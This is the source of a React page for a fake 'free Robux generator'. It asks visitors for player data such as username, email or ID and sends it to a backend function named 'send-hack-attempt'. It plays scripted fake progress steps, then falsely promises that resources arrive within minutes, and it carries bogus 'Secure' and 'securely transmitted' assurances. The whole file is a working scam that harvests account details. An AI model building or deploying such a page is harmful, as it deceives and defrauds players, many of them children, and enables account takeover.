import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { Sparkles, ShieldCheck, Zap, CheckCircle2, Play } from "lucide-react";

const STEPS = [
  "Connecting to server...",
  "Verifying account...",
  "Preparing transfer...",
  "Sending resources...",
];

const Index = () => {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [steps, setSteps] = useState<string[]>([]);
  const [done, setDone] = useState(false);

  useEffect(() => {
    document.title = "Robux Generator 2026 — Free Robux";
    const desc = "The #1 free Robux generator of 2026. Fast, simple, reliable.";
    let m = document.querySelector('meta[name="description"]');
    if (!m) {
      m = document.createElement("meta");
      m.setAttribute("name", "description");
      document.head.appendChild(m);
    }
    m.setAttribute("content", desc);
  }, []);

  const handleClaim = async () => {
    if (!input.trim()) {
      toast({
        title: "Missing info",
        description: "Please enter your player data to continue.",
        variant: "destructive",
      });
      return;
    }
    setLoading(true);
    setDone(false);
    setSteps([]);

    const sendPromise = supabase.functions.invoke("send-hack-attempt", {
      body: { input },
    });

    for (let i = 0; i < STEPS.length; i++) {
      await new Promise((r) => setTimeout(r, 550 + Math.random() * 350));
      setSteps((prev) => [...prev, STEPS[i]]);
    }

    await new Promise((r) => setTimeout(r, 600));
    await sendPromise;

    setLoading(false);
    setDone(true);
    setInput("");
  };

  return (
    <main className="relative min-h-screen flex flex-col items-center px-4 py-12 sm:py-16">
      {/* Subtle background accent */}
      <div
        aria-hidden
        className="pointer-events-none fixed inset-0 -z-10 opacity-60"
        style={{
          background:
            "radial-gradient(60% 50% at 50% 0%, hsl(var(--primary) / 0.15), transparent 60%)",
        }}
      />

      <header className="text-center max-w-xl w-full mb-10">
        <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-secondary text-muted-foreground text-xs mb-5 border border-border">
          <Sparkles className="h-3.5 w-3.5 text-primary" />
          <span>Robux Generator · 2026 Edition</span>
        </div>
        <h1 className="text-3xl sm:text-5xl font-semibold tracking-tight mb-3">
          Get Free Robux Instantly
        </h1>
        <p className="text-muted-foreground text-sm sm:text-base leading-relaxed">
          Enter your player data below and receive your resources within minutes. No download required.
        </p>
      </header>

      <section
        aria-label="Robux generator"
        className="w-full max-w-md bg-card border border-border rounded-2xl p-6 sm:p-7 shadow-xl shadow-black/40"
      >
        <label
          htmlFor="player-data"
          className="block text-sm font-medium mb-2"
        >
          Player data
        </label>
        <Input
          id="player-data"
          value={input}
          onChange={(e) => setInput(e.target.value)}
          disabled={loading}
          placeholder="Username, email, ID..."
          maxLength={5000}
          className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary"
        />
        <p className="text-xs text-muted-foreground mt-2">
          Your information is securely transmitted.
        </p>

        <Button
          onClick={handleClaim}
          disabled={loading}
          className="w-full mt-5 h-12 rounded-lg font-medium text-base"
        >
          {loading ? "Processing..." : "Claim Robux"}
        </Button>

        {(steps.length > 0 || done) && (
          <div className="mt-6 space-y-2">
            {steps.map((s, i) => (
              <div
                key={i}
                className="flex items-center gap-2 text-sm text-muted-foreground"
              >
                <CheckCircle2 className="h-4 w-4 text-primary shrink-0" />
                <span>{s}</span>
              </div>
            ))}
            {done && (
              <div className="mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30">
                <div className="flex items-center gap-2 font-medium text-primary mb-1">
                  <CheckCircle2 className="h-4 w-4" />
                  Request submitted
                </div>
                <p className="text-sm text-foreground/80">
                  Your resources will be delivered within 2–3 minutes.
                </p>
              </div>
            )}
          </div>
        )}

        <div className="grid grid-cols-2 gap-3 mt-6 pt-6 border-t border-border">
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <ShieldCheck className="h-4 w-4 text-primary" />
            Secure
          </div>
          <div className="flex items-center gap-2 text-xs text-muted-foreground">
            <Zap className="h-4 w-4 text-primary" />
            Instant
          </div>
        </div>
      </section>

      {/* Tutorial section */}
      <section
        aria-label="Tutorial video"
        className="w-full max-w-md mt-12"
      >
        <div className="flex items-center gap-2 mb-3">
          <Play className="h-4 w-4 text-primary" />
          <h2 className="text-base font-medium">How it works — Tutorial</h2>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Watch this quick guide before claiming your Robux.
        </p>
        <div className="relative aspect-video w-full rounded-xl overflow-hidden border border-border bg-card">
          <iframe
            className="absolute inset-0 w-full h-full"
            src="https://www.youtube.com/embed/boFceTxmo5o"
            title="Tutorial — Robux Generator"
            loading="lazy"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
            referrerPolicy="strict-origin-when-cross-origin"
            allowFullScreen
          />
        </div>
      </section>

      <footer className="mt-12 text-center text-xs text-muted-foreground/70">
        <p>Private tool · Use at your own risk</p>
      </footer>
    </main>
  );
};

export default Index;
